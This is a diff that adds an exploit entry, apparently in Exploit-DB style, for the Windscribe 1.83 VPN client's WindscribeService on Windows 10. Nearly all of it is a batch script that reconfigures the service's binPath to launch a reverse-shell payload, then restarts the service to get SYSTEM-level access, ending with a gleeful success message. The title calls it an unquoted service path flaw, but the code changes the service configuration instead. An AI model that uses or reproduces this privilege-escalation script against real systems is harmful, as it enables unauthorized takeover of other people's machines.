@@ -1,0 +1,21 @@
+# Exploit Title: Windscribe 1.83 - 'WindscribeService' Unquoted Service Path
+# Date: 2020-06-26
+# Exploit Author: Ethan Seow
+# Vendor Homepage: https://windscribe.com
+# Version: v1.83 Build 20
+# Tested on: Microsoft Windows 10 Home 10.0.18363 Build 18363
+
+
+#filename : exploit.bat
+
+#Code start
+@echo off
+
+sc config WindscribeService binPath="cmd /k {PATH TO REVERSE SHELL e.g.
+C:\Users\Public\payload.exe}"
+sc stop WindscribeService
+sc start WindscribeService
+echo Exploit success! SYSTEM reverse shell should be triggered :DDDDD
+pause
+
+#Code end
